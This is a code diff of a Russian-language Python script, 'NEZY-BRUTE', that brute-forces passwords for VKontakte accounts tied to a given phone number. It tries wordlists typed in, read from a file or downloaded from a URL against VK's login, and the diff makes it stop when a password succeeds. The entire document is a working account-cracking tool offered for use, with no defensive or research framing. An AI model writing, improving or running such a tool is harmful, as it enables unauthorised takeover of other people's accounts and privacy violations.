@@ -3,41 +3,36 @@ import os
 import time
 import vk_api
 import colorama
-from colorama import init
-from colorama import Fore, Back, Style
-from datetime import date
-import datetime
+from colorama import init, Fore, Back, Style
+from datetime import datetime
+try:
+    import vk_api
+    import colorama
+except ImportError as e:
+    print(Fore.RED, f'[NEZY-BRUTE] Ошибка импорта модуля: {e}')
+    print(Fore.GREEN, f'[NEZY-BRUTE] Начинаем установку модулей....')
+    os.system('pip install vk_api requests colorama')
+    import vk_api
+    import colorama
+    import requests 
+    
 init()
-
-try:
-    import vk_api
-except ImportError:
-    os.system('pip install vk_api')
-    import vk_api
-
-try:
-    import requests
-except ImportError:
-    os.system('pip install requests')
-    import requests
-
-try:
-    import colorama
-except ImportError:
-    os.system('pip install colorama')
-    import colorama
 
 def authorize(phone, password):
     try:
         session = vk_api.VkApi(phone, password)
         session.auth()
+        now = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
+        print(Fore.GREEN, f'[NEZY-BRUTE] Пароль успешно подобран: {password}. Время: {now}')
+        return True
     except vk_api.AuthError as e:
         print(Fore.RED, f'[NEZY-BRUTE] Неверный пароль: {password}. Ошибка: {e}')
+        return False
     except Exception as e:
         print(Fore.RED, f'[NEZY-BRUTE] Произошла ошибка: {e}')
-        
-now = datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S')
+        return False
 
+now = datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S')
 print(Fore.MAGENTA, ' _   _                ')
 print(Fore.MAGENTA, '| \ | |               ')
 print(Fore.MAGENTA, '|  \| | ___ _____   _ ')
@@ -50,55 +45,40 @@ print('\n')
 print(Fore.WHITE, 'Coded by @NezyGhoul#8130')
 print('\n')
 
-
-print(Fore.LIGHTCYAN_EX, '[1] Через введенную строку.')
-print(Fore.LIGHTCYAN_EX, '[2] Через файл.')
-print(Fore.LIGHTCYAN_EX, '[3] Через ссылку.')
-method = input('Выбери метод брутфорса -> ')
-
-if int(method) == 1:
-    phone = input('[*] Напишите номер телефона -> ')
-    catched = list(map(str, input("[*] Введи слова для брутфорса через запятую -> ").split(', ')))
-    for password in catched:
-      try:
-         autorize(phone, str(password))
-         print(Fore.GREEN, f'[NEZY-BRUTE] Пароль успешно подобран: {password}. Время: {now}')
-      except:
-        print(Fore.RED, '[NEZY-BRUTE] Пароль неверный: ' + str(password))
-    os.system('pause')
-if int(method) == 2:
-    phone = input('[*] Напишите номер телефона -> ')
-    filename = input('[*] Введите название файла -> ')
-    try:
-      with open(filename) as file:
-        lines = file.readlines()
-        password_lines = [line.strip('\n') for line in open(filename)]
-    except FileNotFoundError:
-      print(Fore.RED, f'[NEZY-BRUTE] Файл {filename} не найден.')
-    for password in password_lines:
-        try:
-            autorize(phone, str(password))
-            print(Fore.GREEN, f'[NEZY-BRUTE] Пароль успешно подобран: {password}. Время: {now}')
-        except:
-            print(Fore.RED, '[NEZY-BRUTE] Пароль неверный: ' + str(password))
-    file.close()
-    os.system('pause')
-if int(method) == 3:
-     phone = input('[*] Напишите номер телефона -> ')
-     url = input('[*] Введите ссылку на базу паролей -> ')
-     rq = requests.get(url)
-     password_lines = list(map(str, rq.text.split('\n')))
-     for password in password_lines:
-        try:
-            autorize(phone, str(password))
-            print(Fore.GREEN, f'[NEZY-BRUTE] Пароль успешно подобран: {password}. Время: {now}')
-        except:
-            print(Fore.RED, '[NEZY-BRUTE] Пароль неверный: ' + str(password))
-     os.system('pause')
-else:
-    while True:
+while True:
+    print(Fore.LIGHTCYAN_EX, '[1] Через введенную строку.')
+    print(Fore.LIGHTCYAN_EX, '[2] Через файл.')
+    print(Fore.LIGHTCYAN_EX, '[3] Через ссылку.')
     method = input('Выбери метод брутфорса -> ')
     if method not in ['1', '2', '3']:
-        print(Fore.RED, '[-] Такого действия нету. Попробуйте снова!')
+        print(Fore.RED, '[-] Такого действия нет. Попробуйте снова!')
     else:
         break
+        
+phone = input('[*] Напишите номер телефона -> ')
+
+if method == '1':
+    catched = list(map(str, input("[*] Введи слова для брутфорса через запятую -> ").split(', ')))
+    for password in catched:
+        if authorize(phone, password):
+            break
+
+if method == '2':
+    filename = input('[*] Введите название файла -> ')
+    try:
+        with open(filename) as file:
+            password_lines = [line.strip() for line in file]
+    except FileNotFoundError:
+        print(Fore.RED, f'[NEZY-BRUTE] Файл {filename} не найден.')
+    for password in password_lines:
+        if authorize(phone, password):
+            break
+    file.close()
+
+if method == '3':
+    url = input('[*] Введите ссылку на базу паролей -> ')
+    rq = requests.get(url)
+    password_lines = rq.text.split('\n')
+    for password in password_lines:
+        if authorize(phone, password):
+            break
